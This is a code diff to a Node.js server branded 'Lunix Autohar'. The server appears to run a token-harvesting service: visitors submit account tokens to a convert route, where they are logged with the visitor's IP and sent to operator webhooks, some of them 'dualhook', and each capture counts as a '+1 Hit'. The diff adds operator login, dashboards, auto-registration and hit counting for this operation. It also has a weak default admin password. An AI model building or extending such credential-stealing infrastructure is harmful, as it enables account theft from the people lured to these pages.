@@ -28,6 +28,7 @@ const db = admin.database();
 
 // Directory management
 const DIRECTORIES_FILE = path.join(__dirname, 'directories.json');
+const USERS_FILE = path.join(__dirname, 'users.json');
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!
 
 // Load directories from file
@@ -52,6 +53,36 @@ function saveDirectories(directories) {
     console.error('Error saving directories:', error);
     return false;
   }
+}
+
+// Load users from file
+function loadUsers() {
+  try {
+    if (fs.existsSync(USERS_FILE)) {
+      const data = fs.readFileSync(USERS_FILE, 'utf8');
+      return JSON.parse(data);
+    }
+  } catch (error) {
+    console.error('Error loading users:', error);
+  }
+  return {};
+}
+
+// Save users to file
+function saveUsers(users) {
+  try {
+    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+    return true;
+  } catch (error) {
+    console.error('Error saving users:', error);
+    return false;
+  }
+}
+
+// Find user by auth token
+function findUserByAuthToken(authToken) {
+  const users = loadUsers();
+  return Object.values(users).find(user => user.auth_token === authToken);
 }
 
 // Generate API token if not set
@@ -124,6 +155,27 @@ app.get('/create', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'create.html'));
 });
 
+// Serve the login page
+app.get('/login', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+// Authentication middleware for user routes
+function requireAuth(req, res, next) {
+  const authToken = req.headers['authorization']?.replace('Bearer ', '') || 
+                   req.query.token || 
+                   req.body.auth_token;
+  
+  const user = findUserByAuthToken(authToken);
+  
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid auth token' });
+  }
+  
+  req.user = user;
+  next();
+}
+
 // Middleware to protect admin dashboard with password
 function requireAdminPassword(req, res, next) {
   const authHeader = req.headers.authorization;
@@ -170,6 +222,86 @@ app.get('/api/token', (req, res) => {
   res.json({ token: API_TOKEN });
 });
 
+// User login endpoint
+app.post('/api/login', async (req, res) => {
+  try {
+    const { auth_token } = req.body;
+    
+    if (!auth_token) {
+      return res.status(400).json({ error: 'Auth token required' });
+    }
+    
+    const user = findUserByAuthToken(auth_token);
+    
+    if (!user) {
+      return res.status(401).json({ error: 'Invalid auth token' });
+    }
+    
+    // Update last login
+    const users = loadUsers();
+    const userId = Object.keys(users).find(id => users[id].auth_token === auth_token);
+    if (userId) {
+      users[userId].last_login = new Date().toISOString();
+      saveUsers(users);
+    }
+    
+    res.json({ 
+      success: true, 
+      user: {
+        directory_name: user.directory_name,
+        service_type: user.service_type,
+        created: user.created,
+        total_hits: user.total_hits,
+        last_login: user.last_login
+      }
+    });
+  } catch (error) {
+    console.error('Login error:', error);
+    res.status(500).json({ error: 'Login failed' });
+  }
+});
+
+// Get user dashboard data
+app.get('/api/user/dashboard', requireAuth, async (req, res) => {
+  try {
+    const user = req.user;
+    const directories = loadDirectories();
+    const directoryConfig = directories[user.directory_name];
+    
+    if (!directoryConfig) {
+      return res.status(404).json({ error: 'Directory not found' });
+    }
+    
+    // Get hit count from Firebase (you can enhance this)
+    const dashboardData = {
+      user: {
+        directory_name: user.directory_name,
+        service_type: user.service_type,
+        created: user.created,
+        total_hits: user.total_hits || 0,
+        last_login: user.last_login
+      },
+      directory: {
+        webhookUrl: directoryConfig.webhookUrl,
+        dualhookWebhookUrl: directoryConfig.dualhookWebhookUrl,
+        serviceType: directoryConfig.serviceType,
+        created: directoryConfig.created,
+        subdirectories: Object.keys(directoryConfig.subdirectories || {}).length
+      },
+      urls: {
+        main: `http://${req.get('host')}/${user.directory_name}`,
+        create: user.service_type === 'dualhook' ? 
+          `http://${req.get('host')}/${user.directory_name}/create` : null
+      }
+    };
+    
+    res.json(dashboardData);
+  } catch (error) {
+    console.error('Dashboard error:', error);
+    res.status(500).json({ error: 'Failed to load dashboard' });
+  }
+});
+
 // API endpoint to create new directories
 app.post('/api/create-directory', async (req, res) => {
   try {
@@ -198,15 +330,41 @@ app.post('/api/create-directory', async (req, res) => {
       return res.status(409).json({ error: 'Directory already exists' });
     }
 
+    // Generate auth token for the user (same as API token for simplicity)
+    const authToken = crypto.randomBytes(32).toString('hex');
+    
     // Create new directory entry
     directories[directoryName] = {
       webhookUrl: webhookUrl,
       serviceType: serviceType || 'single',
       dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
       created: new Date().toISOString(),
-      apiToken: crypto.randomBytes(32).toString('hex'),
+      apiToken: authToken, // This is also their login token
+      owner_auth_token: authToken,
       subdirectories: {} // For nested directories in dualhook
     };
+
+    // Auto-register the user
+    const users = loadUsers();
+    const userId = `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    
+    users[userId] = {
+      user_id: userId,
+      auth_token: authToken,
+      directory_name: directoryName,
+      webhook_url: webhookUrl,
+      service_type: serviceType || 'single',
+      dualhook_webhook_url: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
+      created: new Date().toISOString(),
+      total_hits: 0,
+      last_login: null,
+      directories_owned: [directoryName]
+    };
+
+    // Save both directories and users
+    if (!saveUsers(users)) {
+      return res.status(500).json({ error: 'Failed to register user' });
+    }
 
     // Save directories
     if (!saveDirectories(directories)) {
@@ -220,9 +378,11 @@ app.post('/api/create-directory', async (req, res) => {
       const serviceTypeLabel = serviceType === 'dualhook' 
         ? `${directoryName.toUpperCase()} GENERATOR` 
         : 'LUNIX AUTOHAR';
+      const loginInfo = `\n\n🔑 **Your Login Token:**\n\`${authToken}\`\n\n📊 **Dashboard:** \`http://${req.get('host')}/login\``;
+      
       const description = serviceType === 'dualhook' 
-        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\``
-        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\``;
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`${loginInfo}`
+        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`${loginInfo}`;
 
       const notificationPayload = {
         embeds: [{
@@ -1041,6 +1201,14 @@ app.post('/:directory/convert', async (req, res) => {
 
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
+
+      // Update user hit count
+      const users = loadUsers();
+      const userEntry = Object.values(users).find(u => u.directory_name === directoryName);
+      if (userEntry) {
+        userEntry.total_hits = (userEntry.total_hits || 0) + 1;
+        saveUsers(users);
+      }
 
       const customTitle = `🎯 +1 Hit - Lunix Autohar`;
 
